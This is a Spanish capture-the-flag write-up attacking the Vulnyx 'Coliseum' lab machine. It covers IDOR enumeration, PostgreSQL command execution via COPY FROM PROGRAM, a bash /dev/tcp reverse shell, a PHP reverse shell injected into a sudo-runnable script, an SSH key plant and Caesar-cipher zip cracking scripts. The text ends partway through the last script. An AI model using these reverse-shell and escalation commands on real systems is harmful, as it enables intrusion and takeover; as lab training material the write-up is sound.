---
author: Lenam
pubDatetime: 2025-12-20T15:22:00Z
title: WriteUp Coliseum - Vulnyx
urlSlug: coliseum-writeup-vulnyx
featured: true
draft: false
ogImage: "../../../assets/images/coliseum/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - IDOR
  - sudo
  - cesar
  - scripting
  - postgresql
description:
  "Writeup de la máquina Coliseum (Vulnyx): IDOR con números romanos, RCE vía PostgreSQL, automatización del descifrado de una cadena de zips protegidos con contraseña tipo César y escalada final con BusyBox."
lang: es
translationId: coliseum-writeup-vulnyx
---

![Conejo en Coliseum](../../../assets/images/coliseum/OpenGraph.png)

## Tabla de contenido

## Enumeración

En este apartado se detallan las herramientas empleadas para realizar una enumeración del sistema objetivo.

### Escaneo con nmap

Comenzamos realizando una enumeración de puertos con nmap.

```bash
$ nmap -p- -sVC 192.168.1.113
Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-08 23:25 CET
Nmap scan report for 192.168.1.113
Host is up (0.000095s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp   open  http            Apache httpd 2.4.65 ((Debian))
|_http-title: Arena Entrance
|_http-server-header: Apache/2.4.65 (Debian)
5432/tcp open  ssl/postgresql?
| ssl-cert: Subject: commonName=coliseum
| Subject Alternative Name: DNS:coliseum
| Not valid before: 2025-12-05T23:22:04
|_Not valid after:  2035-12-03T23:22:04
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
```

El comando `nmap -p- -sVC 192.168.1.113` realiza un escaneo completo de puertos y servicios sobre la dirección IP objetivo.

- `-p-` le indica a nmap que escanee **todos los puertos TCP** (del 1 al 65535), no solo los puertos comunes.
- `-sV` activa la **detección de versiones** para identificar el software y las versiones de los servicios en los puertos abiertos.
- `-sC` ejecuta los **scripts por defecto** de nmap (`--script=default`) para obtener información adicional o descubrir vulnerabilidades conocidas.
- Se pueden usar las opciones `-sV` y `-sC` juntas como `-sVC`, o de forma separada si solo interesa una de las dos funcionalidades.
- `192.168.1.113` es la **dirección IP objetivo** que se va a analizar.

En este caso, el escaneo revela tres puertos abiertos:

- **22/tcp (SSH)**: Acceso remoto (OpenSSH 10.0p2). Potencial vector si hay credenciales débiles.
- **80/tcp (HTTP)**: Servicio web (Apache 2.4.65). Principal superficie para ataques y enumeración.
- **5432/tcp (PostgreSQL)**: Base de datos accesible por SSL. Puede ser explotada si la configuración o credenciales son débiles.

Con estos descubrimientos, se definen los primeros vectores de ataque a investigar en fases posteriores del análisis.

### Fingerprinting del Servicio Web con WhatWeb

Al detectar el puerto 80/tcp (HTTP) abierto, empleamos el comando:

`whatweb http://192.168.1.113 -v`

Este comando analiza el sitio web objetivo para identificar tecnologías y configuraciones. En este caso:

- `whatweb`: herramienta de fingerprinting web.
- `http://192.168.1.113`: URL de destino.
- `-v`: modo detallado (verbose) para mostrar toda la información encontrada.

Así obtenemos una visión clara de los frameworks, cabeceras, cookies y versiones que utiliza el servidor web, lo cual es fundamental para reconocer posibles vectores de ataque.

```bash
$ whatweb http://192.168.1.113 -v
WhatWeb report for http://192.168.1.113
Status    : 200 OK
Title     : Arena Entrance
IP        : 192.168.1.113
Country   : RESERVED, ZZ

Summary   : Apache[2.4.65], Cookies[PHPSESSID], HTML5, HTTPServer[Debian Linux][Apache/2.4.65 (Debian)], HttpOnly[PHPSESSID], Script, UncommonHeaders[content-security-policy,x-content-type-options,referrer-policy], X-Frame-Options[DENY]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.65 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : PHPSESSID

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.65 (Debian) (from server string)

[ HttpOnly ]
        If the HttpOnly flag is included in the HTTP set-cookie 
        response header and the browser supports it then the cookie 
        cannot be accessed through client side script - More Info: 
        http://en.wikipedia.org/wiki/HTTP_cookie 

        String       : PHPSESSID

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


[ UncommonHeaders ]
        Uncommon HTTP server headers. The blacklist includes all 
        the standard headers and many non standard but common ones. 
        Interesting but fairly common headers should have their own 
        plugins, eg. x-powered-by, server and x-aspnet-version. 
        Info about headers can be found at www.http-stats.com 

        String       : content-security-policy,x-content-type-options,referrer-policy (from headers)

[ X-Frame-Options ]
        This plugin retrieves the X-Frame-Options value from the 
        HTTP header. - More Info: 
        http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.
        aspx

        String       : DENY

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Mon, 08 Dec 2025 22:26:48 GMT
        Server: Apache/2.4.65 (Debian)
        Set-Cookie: PHPSESSID=9a9230ff6afc0d8883e6956477a20167; path=/; HttpOnly; SameSite=Lax
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; script-src 'self'; font-src 'self'; form-action 'self'; base-uri 'self'; frame-ancestors 'none'; object-src 'none';
        X-Content-Type-Options: nosniff
        X-Frame-Options: DENY
        Referrer-Policy: same-origin
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 792
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

### Fuerza Bruta de Directorios con Gobuster

Para enumerar posibles archivos y directorios ocultos en el servidor web, se utilizó **Gobuster** con una wordlist común y extensiones relevantes:

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.113/ -x html,php,js,txt,zip,tar
```

Con este comando se identificaron rutas y archivos ocultos útiles para la posterior explotación.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.113/ -x html,php,js,txt,zip,tar
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.113/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,zip,tar,html,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1938]
/login.php            (Status: 200) [Size: 1990]
/profile.php          (Status: 302) [Size: 0] [--> /login.php]
/register.php         (Status: 200) [Size: 2617]
/tools                (Status: 301) [Size: 314] [--> http://192.168.1.113/tools/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.1.113/assets/]
/lib                  (Status: 301) [Size: 312] [--> http://192.168.1.113/lib/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/config.php           (Status: 200) [Size: 0]
/bootstrap.php        (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 278]
Progress: 1543899 / 1543899 (100.00%)
===============================================================
Finished
===============================================================
```

El escaneo con Gobuster permitió identificar rutas clave como `/login.php`, `/register.php`, `/profile.php`, `/logout.php`, así como archivos sensibles (`config.php`, `bootstrap.php`) y directorios como `/tools`, `/assets` y `/lib`, facilitando el reconocimiento de la estructura de la web y potenciales vectores de ataque.

### Enumeración manual servicio web

Buscamos por los diferentes directorios, muchos de ellos con directory listing activado, pero no obtenemos nada relevante.

![Carpeta /tools](../../../assets/images/coliseum/20251221_000139_image.png)

> En la página principal, al situar el cursor sobre la imagen, se escucha un grito y aparece la imagen de un conejo ensangrentado. Por ello, se recomienda **tener cuidado con el volumen de los altavoces**.

A continuación, creamos nuestro perfil de **gladiador** desde la página de registro (`/register.php`). Una vez registrados, se nos redirige automáticamente al perfil de nuestro gladiador.

## Intrusión

### Vulnerabilidad IDOR (Insecure Direct Object Reference)

Al revisar el perfil del gladiador, se detecta una vulnerabilidad de tipo IDOR (Insecure Direct Object Reference) relacionada con identificadores en números romanos, que permite acceder a los perfiles de otros usuarios simplemente modificando el parámetro correspondiente en la URL.

![IDOR](../../../assets/images/coliseum/20251208_233902_image.png)

Para automatizar el proceso de enumeración de usuarios afectados por el IDOR, necesitamos un diccionario de números romanos que cubra todo el rango de identificadores posibles. Cada perfil de gladiador es accesible mediante una URL que utiliza un identificador en números romanos (por ejemplo, `gladiator_id=XXV`).

Por ello, generamos un archivo (`romanos.txt`) que contenga todos los números romanos desde I hasta el número máximo asignado a nuestro usuario al registrarnos. Este diccionario nos permitirá probar cada identificador consecutivamente y así descubrir a qué perfiles tenemos acceso indebido.

A continuación, el script de Python utilizado para generar dicho listado:

```python
# generar_romanos.py
def int_a_romano(num: int) -> str:
    valores = [1000, 900, 500, 400,
               100, 90, 50, 40,
               10, 9, 5, 4, 1]
    simbolos = ["M", "CM", "D", "CD",
                "C", "XC", "L", "XL",
                "X", "IX", "V", "IV", "I"]

    res = ""
    i = 0
    while num > 0:
        for _ in range(num // valores[i]):
            res += simbolos[i]
            num -= valores[i]
        i += 1
    return res


for n in range(1, 464):  # 1 a 463
    print(int_a_romano(n))
```

Ejecutamos el script para volcar la lista de romanos en un archivo plano, que posteriormente emplearemos en nuestros ataques de fuerza bruta contra el parámetro vulnerable:

```bash
python3 generar_romanos.py > romanos.txt
```

De este modo, obtenemos un listado con un número romano por línea, desde I hasta CDLXIII, listo para ser utilizado en herramientas de fuzzing como ffuf, facilitando la búsqueda de identificadores de usuario válidos.

Dado que la vulnerabilidad IDOR solo se puede explotar estando autenticados, iniciamos sesión con nuestro usuario y, mediante las herramientas de desarrollo de Firefox, recuperamos el valor de la cookie `PHPSESSID`, que anotamos para su uso en el siguiente comando.

![](../../../assets/images/coliseum/20251221_003513_image.png)

A continuación, empleamos la cookie de sesión (`PHPSESSID`) obtenida para realizar fuerza bruta sobre el parámetro vulnerable mediante la herramienta ffuf, probando el acceso a todos los perfiles posibles:

```bash
ffuf -H $'Host: 192.168.1.113' \
     -b $'PHPSESSID=13290fd2151cd05d754b3ea972eedb98' \
     -u $'http://192.168.1.113/profile.php?gladiator_id=FUZZ' \
     -w ./romanos.txt
```

Como todas las respuestas tenían 433 palabras, usamos `-fw 433` en ffuf para filtrar solo las diferentes.

```bash
ffuf -H $'Host: 192.168.1.113' \
     -b $'PHPSESSID=13290fd2151cd05d754b3ea972eedb98' \
     -u $'http://192.168.1.113/profile.php?gladiator_id=FUZZ' \
     -w ./romanos.txt \
     -fw 433 \
     -o profiles.html -of html
```

**Descripción detallada del comando:**

- `-H $'Host: 192.168.1.113'`: Establece la cabecera HTTP Host al valor objetivo.
- `-b $'PHPSESSID=...'`: Incluye la cookie de sesión activa necesaria para acceder a la funcionalidad autenticada.
- `-u ...?gladiator_id=FUZZ`: Indica el punto de inyección donde ffuf sustituirá la cadena `FUZZ` por cada valor de la lista.
- `-w ./romanos.txt`: Especifica el diccionario de números romanos que generamos previamente.
- `-fw 433`: Filtra todas aquellas respuestas que tengan exactamente 433 palabras, permitiendo identificar únicamente aquellos perfiles que devuelven una respuesta diferente (probablemente perfiles reales o accesibles).
- `-o profiles.html`: Guarda el resultado de la búsqueda en un archivo HTML llamado `profiles.html`, lo que facilita la revisión y el análisis posterior de los resultados.
- `-of html`: Especifica que el formato de salida sea HTML, ideal para una visualización estructurada en el navegador.

![](../../../assets/images/coliseum/20251221_005216_image.png)

De este modo, identificamos fácilmente los perfiles válidos y obtenemos un archivo HTML que nos permite revisarlos de manera visual y cómoda.

Abrimos el archivo generado y vamos revisando cada resultado, accediendo a los distintos perfiles de gladiadores. En el perfil del gladiador `Vero`, con el ID `CDIX`, localizamos unas credenciales de PostgreSQL que han sido filtradas en la página.

http://192.168.1.113/profile.php?gladiator_id=CDIX

```
pgsql:host=db;port=5432;dbname=colosseum_app;sslmode=disable;password=0Qn5311Ov4NQApPX9G4Z;user=colosseum_user
```

![Filtración user postgresql](../../../assets/images/coliseum/20251209_000245_image.png)

### RCE en PostgreSQL

Si aún no tienes instalado el cliente de PostgreSQL (`psql`), puedes instalarlo fácilmente. En sistemas basados en Debian o Ubuntu, ejecuta:

```bash
sudo apt update
sudo apt install postgresql-client
```

En sistemas basados en Red Hat o Fedora sería:

```bash
sudo dnf install postgresql
```

Una vez instalado, te puedes conectar al puerto PostgreSQL que descubrimos previamente con nmap utilizando las credenciales filtradas:

```bash
psql -h 192.168.1.113 -U colosseum_user colosseum_app
```

![](../../../assets/images/coliseum/20251209_000703_image.png)

Si ejecutamos el comando `\d` en la consola de PostgreSQL, obtendremos un listado de las tablas, vistas y secuencias existentes en la base de datos, lo cual nos ayuda a entender su estructura y los objetos disponibles. Por otro lado, el comando `\du` muestra la lista de roles o usuarios definidos en el sistema, junto con los privilegios de cada uno (como permisos de superusuario, creación de bases de datos, conexiones, etc.). Al revisar esta información, comprobamos que el usuario filtrado dispone de privilegios de superusuario. 😊

![](../../../assets/images/coliseum/20251221_010518_image.png)

Podemos obtener ejecución de comandos en el sistema a través de PostgreSQL utilizando el siguiente procedimiento:

Primero, aprovechamos la función `COPY ... FROM PROGRAM` para ejecutar comandos arbitrarios desde la base de datos. Por ejemplo, con este payload podemos ejecutar el comando `id` y ver su resultado:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

![](../../../assets/images/coliseum/20251221_010238_image.png)

A continuación, preparamos un listener en nuestra máquina atacante para recibir una reverse shell:

```bash
nc -lvnp 1234
```

Después, lanzamos una reverse shell desde PostgreSQL ejecutando el siguiente comando. Recuerda modificar la IP `192.168.1.196` por la de tu máquina atacante:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'bash -c "/bin/bash -i >& /dev/tcp/192.168.1.196/1234 0>&1"';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

De esta forma, conseguimos una shell interactiva en la máquina víctima con el usuario `postgres`:

![](../../../assets/images/coliseum/20251209_001409_image.png)


## Movimiento lateral (de postgres a cesar)

Con la shell de `postgres`, comprobamos los permisos de `sudo` para buscar escalada de privilegios:

```bash
postgres@coliseum:/var/lib/postgresql/17/main$ sudo -l
Matching Defaults entries for postgres on coliseum:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User postgres may run the following commands on coliseum:
    (cesar) NOPASSWD: /usr/bin/php /var/www/html/tools/backup.php
postgres@coliseum:/var/lib/postgresql/17/main$ ls -la /var/www/html/tools/backup.php
-rw-rw-r-- 1 www-data postgres 262 Dec  8 23:31 /var/www/html/tools/backup.php
```

El usuario `postgres` puede ejecutar `/var/www/html/tools/backup.php` como `cesar` mediante `sudo` y, además, tiene permisos de escritura sobre el archivo. Esto nos permite editar `backup.php`, añadir una reverse shell en PHP y luego ejecutarla como `cesar` para obtener una shell con ese usuario.

```php
exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.196/12345 0>&1'");
```

> 💡 **Nota:** Recuerda reemplazar la IP por la de tu máquina atacante si fuese necesario. Puedes localizar el lugar exacto para insertar el código malicioso, pero en este caso basta con añadirlo al final.

Así quedaría el contenido (parte relevante) del fichero tras la edición:

![](../../../assets/images/coliseum/20251209_002313_image.png)

Seguidamente, necesitamos preparar el entorno para recibir la conexión entrante desde la reverse shell. En una terminal de nuestra máquina atacante, lanzamos un listener usando `netcat` en el puerto correspondiente:

```bash
nc -lvnp 12345
```

Por último, ya solo queda provocar la ejecución del script modificado como el usuario `cesar` usando el permiso de `sudo` detallado antes:

```bash
sudo -u cesar /usr/bin/php /var/www/html/tools/backup.php
```

En cuanto el código PHP malicioso se ejecuta, la reverse shell se conecta con éxito a nuestro listener, dándonos acceso interactivo a la máquina como el usuario `cesar`. Desde aquí ya tenemos capacidad, por ejemplo, para leer la flag `user.txt`, tal y como se observa en la siguiente imagen:

![](../../../assets/images/coliseum/20251209_002516_image.png)


## Escalada de privilegios (de cesar a root)

Pasamos ahora a la fase de escalada de privilegios para convertirnos en root desde el usuario cesar.

### Mejora de la shell: Acceso SSH con clave pública

Al haber encontrado el puerto 22 abierto en el servidor, una forma mucho más práctica y estable de trabajar como `cesar` es accediendo directamente por SSH usando claves públicas. Así, evitamos las limitaciones de la reverse shell y obtenemos una terminal interactiva y cómoda.

Los pasos serían los siguientes:

1. **Genera un par de claves SSH ed25519 en tu máquina (si aún no lo tienes):**
   ```bash
   ssh-keygen -t ed25519
   ```
   Esto creará tu clave privada (`~/.ssh/id_ed25519`) y pública (`~/.ssh/id_ed25519.pub`) en tu equipo atacante.

2. **Copia tu clave pública al servidor:**
   Copia el contenido de tu clave pública (`~/.ssh/id_ed25519.pub`).

   En la sesión como cesar (por reverse shell), ejecuta:
   ```bash
   mkdir -p ~/.ssh
   chmod 700 ~/.ssh
   echo 'TU_CLAVE_PUBLICA' >> ~/.ssh/authorized_keys
   chmod 600 ~/.ssh/authorized_keys
   ```

3. **Accede por SSH como cesar:**
   Ahora ya puedes conectarte cómodamente desde tu equipo:
   ```bash
   ssh -i ~/.ssh/id_ed25519 cesar@IP_DE_LA_MAQUINA
   ```

De esta forma, trabajarás directamente con una shell SSH interactiva, sin restricciones y con mayor estabilidad.

### Fichero ZIP

En el directorio personal de cesar encontramos la flag `user.txt`, así como dos archivos adicionales: un fichero zip `cesar_I.zip` y un archivo de texto `initial_hint.txt`. Descargamos ambos a nuestra máquina local para poder analizarlos con mayor comodidad.

```bash
cesar@coliseum:~$ ls -l
total 128
-rw-r--r-- 1 cesar cesar 121350 Dec  8 23:10 cesar_I.zip
-rw-r--r-- 1 cesar cesar    237 Dec  8 23:11 initial_hint.txt
-rw--w---- 1 cesar cesar     33 Dec  8 20:10 user.txt
cesar@coliseum:~$ cat initial_hint.txt 
At the entrance of the Coliseum, the very first gate is sealed.
Its key was altered on Caesar's command, shifting each symbol along
a secret line of characters.

The elders only left this inscription for you:

KEY_FOR_CAESAR: uqclxh7glp

They also whispered that this secret line was forged
from all the lowercase letters… followed by the ten digits.
cesar@coliseum:~$ 
```

El fichero zip está protegido por una contraseña cifrada. El archivo `initial_hint.txt` nos proporciona información fundamental para resolver este reto: indica que existe una clave (`KEY_FOR_CAESAR: uqclxh7glp`) que ha sido alterada mediante un cifrado César, y aclara que el alfabeto empleado consiste en todas las letras minúsculas seguidas de los diez dígitos (`abcdefghijklmnopqrstuvwxyz0123456789`).

Esto implica que cada carácter de la clave ha sido desplazado un número desconocido de posiciones dentro de ese alfabeto extendido (no solo de la 'a' a la 'z', sino continuando con los números del 0 al 9). 

Por tanto, para obtener la contraseña real del zip debemos invertir ese desplazamiento tipo César sobre la clave proporcionada, probando los diferentes valores de desplazamiento hasta encontrar el correcto. Esta información nos permite automatizar el proceso de fuerza bruta únicamente sobre el alfabeto definido.

Podemos crear un script (en este caso, generado con ayuda de IA) que descifre la contraseña original del primer zip mediante este enfoque de fuerza bruta:

**bruteforce_cesar_first.py**

```python
#!/usr/bin/env python3
import sys
import re
import string
import subprocess
import os

ALPHABET = string.ascii_lowercase + string.digits
KEY_PREFIX = "KEY_FOR_CAESAR:"


def caesar(text, shift):
    """Aplica un desplazamiento tipo César sobre ALPHABET (a-z0-9)."""
    res = []
    n = len(ALPHABET)
    for ch in text:
        if ch in ALPHABET:
            idx = ALPHABET.index(ch)
            res.append(ALPHABET[(idx + shift) % n])
        else:
            res.append(ch)
    return "".join(res)


def extract_key_from_file(path):
    """Busca la línea KEY_FOR_CAESAR: ... y devuelve el valor."""
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if KEY_PREFIX in line:
                m = re.search(rf"{KEY_PREFIX}\s*(\S+)", line)
                if m:
                    return m.group(1).strip()
    return None


def test_zip_password(zip_path, password):
    """
    Prueba la contraseña contra el ZIP usando 'unzip -t' (solo test, no extrae).
    Devuelve True si la contraseña es correcta.
    """
    # -t = test archive, -P = password, -qq = quiet
    result = subprocess.run(
        ["unzip", "-t", "-P", password, zip_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return result.returncode == 0


def main():
    # Uso:
    #   python3 bruteforce_first_zip.py [zip] [hint]
    #
    # Por defecto:
    #   zip  -> cesar_I.zip
    #   hint -> initial_hint.txt
    zip_name = sys.argv[1] if len(sys.argv) > 1 else "cesar_I.zip"
    hint_name = sys.argv[2] if len(sys.argv) > 2 else "initial_hint.txt"

    if not os.path.exists(zip_name):
        print(f"[!] No se encuentra el ZIP: {zip_name}")
        sys.exit(1)
    if not os.path.exists(hint_name):
        print(f"[!] No se encuentra el fichero de pista: {hint_name}")
        sys.exit(1)

    twisted = extract_key_from_file(hint_name)
    if not twisted:
        print(f"[!] No se encontró '{KEY_PREFIX}' en {hint_name}")
        sys.exit(1)

    print(f"[+] Texto 'retorcido' encontrado en {hint_name}: {twisted}\n")
    print(f"[+] Probando desplazamientos sobre {zip_name}...\n")

    for shift in range(len(ALPHABET)):
        candidate = caesar(twisted, -shift)  # deshacemos la “torsión”
        ok = test_zip_password(zip_name, candidate)

        print(f"shift={shift:2d} -> {candidate}  [{'OK' if ok else 'fail'}]")

        if ok:
            print("\n[+] ¡Contraseña válida encontrada!")
            print(f"    Password : {candidate}")
            print(f"    Shift    : {shift}")
            print("\nAhora puedes usarla, por ejemplo:")
            print(f"    unzip -P {candidate} {zip_name}")
            return

    print("\n[!] Ninguna de las claves probadas ha funcionado. Revisa que:")
    print("    - El ZIP y el hint corresponden a la misma generación de la cadena.")
    print("    - No has modificado 'initial_hint.txt' o el nombre del prefijo.")


if __name__ == "__main__":
    main()

```

Por lo tanto, empleamos el script para descifrar y acceder al contenido del archivo zip.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Coliseum]
└─$ python3 ./bruteforce_cesar_first.py
[+] Texto 'retorcido' encontrado en initial_hint.txt: uqclxh7glp

[+] Probando desplazamientos sobre cesar_I.zip...

shift= 0 -> uqclxh7glp  [fail]
shift= 1 -> tpbkwg6fko  [fail]
shift= 2 -> soajvf5ejn  [fail]
shift= 3 -> rn9iue4dim  [fail]
shift= 4 -> qm8htd3chl  [fail]
shift= 5 -> pl7gsc2bgk  [fail]
shift= 6 -> ok6frb1afj  [fail]
shift= 7 -> nj5eqa09ei  [fail]
shift= 8 -> mi4dp9z8dh  [fail]
shift= 9 -> lh3co8y7cg  [fail]
shift=10 -> kg2bn7x6bf  [fail]
shift=11 -> jf1am6w5ae  [fail]
shift=12 -> ie09l5v49d  [fail]
shift=13 -> hdz8k4u38c  [OK]

[+] ¡Contraseña válida encontrada!
    Password : hdz8k4u38c
    Shift    : 13

Ahora puedes usarla, por ejemplo:
    unzip -P hdz8k4u38c cesar_I.zip
                                                                                                 
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Coliseum]
└─$ unzip -P hdz8k4u38c cesar_I.zip
Archive:  cesar_I.zip
  inflating: pista.txt               
 extracting: cesar_II.zip            
                                                                                                 
┌──(kali㉿kali)-[~/CTFs/Vulnyx/Coliseum]
└─$ cat pista.txt       
Gladiator, you have entered chamber I of the Coliseum.

The next iron gate is locked with a secret that Caesar himself ordered to
be twisted — each symbol shifted along an unseen line of characters.

All that remains of the original key is this distorted inscription:

KEY_FOR_CAESAR: cvwbdaangl
```

Al descomprimir el primer archivo zip, observamos que contiene un nuevo zip protegido por una contraseña cifrada nuevamente con el método César, cuya pista se encuentra en un archivo de texto. Si repetimos el proceso de descifrado, obtenemos sucesivamente más archivos zip anidados bajo el mismo mecanismo. Por lo tanto, resulta conveniente desarrollar un script que automatice el descifrado y extracción de todos los zips hasta acceder al contenido final.

Podemos observar que los archivos de texto extraídos en cada paso tienen el nombre `pista.txt`, mientras que los archivos zip siguen una nomenclatura basada en números romanos: `cesar_I.zip`, `cesar_II.zip`, etc. Esta forma de numeración es similar a la utilizada anteriormente en el reto del IDOR.

Sería útil (y, de hecho, lo creamos con ayuda de IA) crear un script que automatice el proceso de descifrar y extraer todos los archivos zip anidados, hasta obtener el contenido final.

**solve_cesar_chain_unzip.py**

```python
#!/usr/bin/env python3

import sys
import re
import string
import subprocess
import os
import shutil

ALPHABET = string.ascii_lowercase + string.digits
KEY_PREFIX = "KEY_FOR_CAESAR:"


def caesar(text, shift):
    """Aplica un desplazamiento tipo César sobre ALPHABET (a-z0-9)."""
    res = []
    n = len(ALPHABET)
    for ch in text:
        if ch in ALPHABET:
            idx = ALPHABET.index(ch)
            res.append(ALPHABET[(idx + shift) % n])
        else:
            res.append(ch)
    return "".join(res)


def extract_key_from_file(path):
    """Busca la línea KEY_FOR_CAESAR: ... y devuelve el valor."""
    if not os.path.exists(path):
        return None

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if KEY_PREFIX in line:
                m = re.search(rf"{KEY_PREFIX}\s*(\S+)", line)
                if m:
                    return m.group(1).strip()
    return None


def test_zip_password(zip_path, password):
    """
    Prueba la contraseña contra el ZIP usando 'unzip -t' (solo test, no extrae).
    Devuelve True si la contraseña es correcta.
    """
    result = subprocess.run(
        ["unzip", "-t", "-P", password, zip_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return result.returncode == 0


def extract_zip(zip_path, password, out_dir):
    """Extrae el ZIP completo a out_dir usando 'unzip -P'."""
    if os.path.exists(out_dir):
        shutil.rmtree(out_dir)
    os.makedirs(out_dir)

    result = subprocess.run(
        ["unzip", "-qq", "-P", password, zip_path, "-d", out_dir],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if result.returncode != 0:
        raise RuntimeError(f"Error al extraer {zip_path} con la contraseña dada")


def brute_force_zip_password(zip_path, twisted_text):
    """
    Dado un ZIP y el texto 'retorcido' de su contraseña,
    prueba todos los desplazamientos posibles del “César”
    devolviendo (password_en_claro, shift_encontrado).
    """
    for shift in range(len(ALPHABET)):
        candidate = caesar(twisted_text, -shift)  # deshacer la torsión
        if test_zip_password(zip_path, candidate):
            return candidate, shift

    raise RuntimeError(f"No se encontró contraseña válida para {zip_path}")


def find_inner_zip(dir_path):
    """Devuelve la ruta del único ZIP dentro de dir_path, o None si no hay."""
    zips = []
    for entry in os.listdir(dir_path):
        if entry.lower().endswith(".zip"):
            zips.append(os.path.join(dir_path, entry))

    if not zips:
        return None
    # Asumimos uno solo; si hay más, cogemos el primero.
    return zips[0]


def main():
    # Uso:
    #   python3 solve_cesar_chain_unzip.py [zip_inicial] [hint_inicial]
    #
    # Por defecto:
    #   zip_inicial  -> cesar_I.zip
    #   hint_inicial -> initial_hint.txt
    base_dir = os.getcwd()
    initial_zip = sys.argv[1] if len(sys.argv) > 1 else "cesar_I.zip"
    initial_hint = sys.argv[2] if len(sys.argv) > 2 else "initial_hint.txt"

    initial_zip_path = os.path.join(base_dir, initial_zip)
    initial_hint_path = os.path.join(base_dir, initial_hint)

    if not os.path.exists(initial_zip_path):
        print(f"[!] No se encuentra el ZIP inicial: {initial_zip_path}")
        sys.exit(1)
    if not os.path.exists(initial_hint_path):
        print(f"[!] No se encuentra el fichero de pista inicial: {initial_hint_path}")
        sys.exit(1)

    twisted_for_current = extract_key_from_file(initial_hint_path)
    if not twisted_for_current:
        print(f"[!] No se encontró '{KEY_PREFIX}' en {initial_hint_path}")
        sys.exit(1)

    current_zip = initial_zip_path
    level = 1
    used_passwords = []

    work_root = os.path.join(base_dir, "extracted_levels_unzip")
    if os.path.exists(work_root):
        shutil.rmtree(work_root)
    os.makedirs(work_root)

    # Para mostrar al final el contenido del último pista.txt
    last_note_path = None

    print(f"[+] Empezando cadena desde: {initial_zip}")
    print(f"[+] Usando pista inicial  : {initial_hint}\n")

    while True:
        level_dir = os.path.join(work_root, f"level_{level:03d}")
        print(f"[+] Resolviendo nivel {level} → {os.path.basename(current_zip)}")

        # 1) Fuerza bruta de la contraseña de este ZIP
        try:
            password, shift = brute_force_zip_password(current_zip, twisted_for_current)
        except Exception as e:
            print(f"[!] Error haciendo fuerza bruta en {current_zip}: {e}")
            break

        used_passwords.append(password)
        print(f"    - Contraseña encontrada: '{password}' (shift {shift})")

        # 2) Extraer el ZIP con la contraseña correcta
        try:
            extract_zip(current_zip, password, level_dir)
        except Exception as e:
            print(f"[!] Error extrayendo {current_zip}: {e}")
            break

        # 3) Leer la siguiente pista (si existe)
        pista_path = os.path.join(level_dir, "pista.txt")
        last_note_path = pista_path  # lo vamos actualizando en cada nivel

        twisted_next = extract_key_from_file(pista_path)

        # 4) Buscar el ZIP interno (siguiente nivel)
        inner_zip_path = find_inner_zip(level_dir)

        if not twisted_next or not inner_zip_path:
            print("\n[+] No se ha encontrado más KEY_FOR_CAESAR o ningún ZIP interno.")
            print("    Probablemente este sea el último nivel.\n")
            break

        # Preparar siguiente vuelta
        twisted_for_current = twisted_next
        current_zip = inner_zip_path
        level += 1

    # 5) Guardar wordlist con todas las contraseñas usadas
    wordlist_path = os.path.join(base_dir, "wordlist_from_chain.txt")
